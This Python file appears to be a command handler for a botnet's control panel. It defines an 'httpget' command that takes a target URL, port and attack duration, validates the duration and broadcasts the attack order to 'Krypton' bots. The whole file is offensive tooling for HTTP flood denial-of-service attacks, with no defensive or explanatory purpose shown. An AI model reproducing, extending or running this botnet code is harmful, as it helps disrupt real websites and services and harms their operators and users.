import time
from colorama import Fore

def httpget(args, validate_time, send, client, ansi_clear, broadcast, data):
    if len(args) == 4:
        url = args[1]
        port = args[2]
        secs = args[3]
        if validate_time(secs):
            time.sleep(1)
            send(client, f"{Fore.LIGHTWHITE_EX}\nAttack successfully sent to all {Fore.LIGHTBLACK_EX}Krypton {Fore.LIGHTWHITE_EX}Bots!\n")
            broadcast(data)
        else:
            send(client, Fore.RED + '\nInvalid attack duration (1-1200 seconds)\n')
    else:
        send(client, f'\nUsage: {Fore.LIGHTBLACK_EX}.httpget [URL] [PORT] [TIME]\n')